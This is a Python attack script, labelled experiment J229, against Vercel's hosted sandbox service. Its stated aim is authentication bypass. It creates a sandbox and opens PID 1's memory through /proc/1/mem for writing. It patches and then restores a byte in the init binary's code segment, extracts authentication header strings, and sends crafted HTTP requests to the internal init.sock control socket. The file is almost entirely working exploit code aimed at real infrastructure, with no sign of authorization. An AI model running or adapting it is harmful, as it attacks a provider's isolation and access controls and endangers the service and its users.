# 实验J229: (A)text段可写测试 (B)dump认证header名 (C)init.sock行为矩阵
# 关键假设: /proc/1/mem O_RDWR 写 r-xp 私有页可能触发COW成功 -> 认证绕过
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj229"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

bashfile(sid, "cp /run/vercel/share/sandbox-init /tmp/si", "CP", 2000)

# A) text段可写测试 + B) dump header名/错误字符串
CODE = r'''
import os, struct, time
out = open("/tmp/d229a.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)

data = open("/tmp/si", "rb").read()
phoff = struct.unpack_from("<Q", data, 0x20)[0]
phentsz = struct.unpack_from("<H", data, 0x36)[0]
phnum = struct.unpack_from("<H", data, 0x38)[0]
segs = []
for i in range(phnum):
    off = phoff + i * phentsz
    p_type, p_flags = struct.unpack_from("<II", data, off)
    p_offset, p_vaddr = struct.unpack_from("<QQ", data, off + 8)
    p_filesz, p_memsz = struct.unpack_from("<QQ", data, off + 0x20)
    segs.append([p_type, p_flags, p_offset, p_vaddr, p_filesz, p_memsz])

def v2f(v):
    for pt, pf, po, pv, pfs, pms in segs:
        if pt == 1 and pv <= v < pv + pfs:
            return po + (v - pv)
    return None

# A1) 找 text 段连续 0xCC padding 区 (re C速度, 避免逐字节被杀)
import re
textseg = [s for s in segs if s[1] & 1 and s[4] > 0x100000]
p("TEXT_SEG", [(hex(s[3]), hex(s[3]+s[4])) for s in textseg])
best = None
for pt, pf, po, pv, pfs, pms in textseg:
    body = data[po:po+pfs]
    m = re.search(rb"\xcc{64,}", body)
    if m:
        best = (pv + m.start(), m.end() - m.start())
        break
p("PAD", hex(best[0]), best[1])
tgt = best[0]
mem_b = ra(tgt, 16)
p("MEM_BEFORE", mem_b.hex())
try:
    n = wa(tgt, b"\x90")
    p("WRITE_RET", n)
except OSError as e:
    p("WRITE_ERR", repr(e))
mem_b2 = ra(tgt, 16)
p("MEM_AFTER", mem_b2.hex())
if mem_b2[0] == 0x90:
    p("TEXT_WRITE_OK")
    wa(tgt, b"\xcc")  # 还原
    p("RESTORED", ra(tgt, 16).hex())
else:
    p("TEXT_WRITE_FAIL")

# B) dump 认证 header 名 (0x9EF056 区) + 错误消息字符串
for v, n in ((0x9ef040, 0xa0), (0x9f1dd0, 0x50), (0x9f60d0, 0x50), (0x9f60f0, 0x40)):
    f = v2f(v)
    if f is None:
        p("STR_NOSEG", hex(v))
        continue
    raw = data[f:f+n]
    s = "".join(chr(c) if 32 <= c < 127 else "." for c in raw)
    p("STR", hex(v), repr(s))
os.close(fd)
p("doneA")
out.close()
'''
st = run_cmd(sid, CODE, "J229A", timeout=200)
time.sleep(1)
bashfile(sid, "cat /tmp/d229a.txt", "OUT_A", 20000)

# C) init.sock 行为矩阵 (子进程隔离, 单个被杀不影响其他)
CODE2 = r'''
import subprocess, sys
out = open("/tmp/d229c.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

S = "/run/vercel/share/init.sock"
def recv_code(sendline):
    return ("import socket; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3); "
            "s.connect('%s'); s.send(%s); d=b'';"
            "exec('\\nwhile True:\\n try:\\n  b2=s.recv(4096)\\n  if not b2: break\\n  d+=b2\\n except Exception: break'); "
            "print('R', d[:300].decode(errors='replace'))" % (S, sendline))

RECV = "b'GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n'"
TESTS = {
 "CONNECT_ONLY": "import socket,time; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(2); s.connect('%s'); print('C_OK'); time.sleep(3); print('ALIVE')" % S,
 "GET_ROOT": recv_code(RECV),
 "GET_PING": recv_code("b'GET /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n'"),
 "POST_JSON": recv_code("b'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nContent-Length: 2\\r\\n\\r\\n{}'"),
 "POST_JSON_CONNECT": recv_code("b'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\nContent-Length: 2\\r\\n\\r\\n{}'"),
 "POST_URLENCODED": recv_code("b'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 2\\r\\n\\r\\n{}'"),
}
for name, code in TESTS.items():
    try:
        r = subprocess.run([sys.executable, "-c", code],
                           capture_output=True, text=True, timeout=12)
        p("T", name, "rc", r.returncode, "OUT", r.stdout.strip()[:200].replace(chr(10), "|"), "ERR", r.stderr.strip()[:200].replace(chr(10), "|"))
    except subprocess.TimeoutExpired:
        p("T", name, "TIMEOUT")
p("doneC")
out.close()
'''
st = run_cmd(sid, CODE2, "J229C", timeout=200)
time.sleep(1)
bashfile(sid, "cat /tmp/d229c.txt", "OUT_C", 20000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
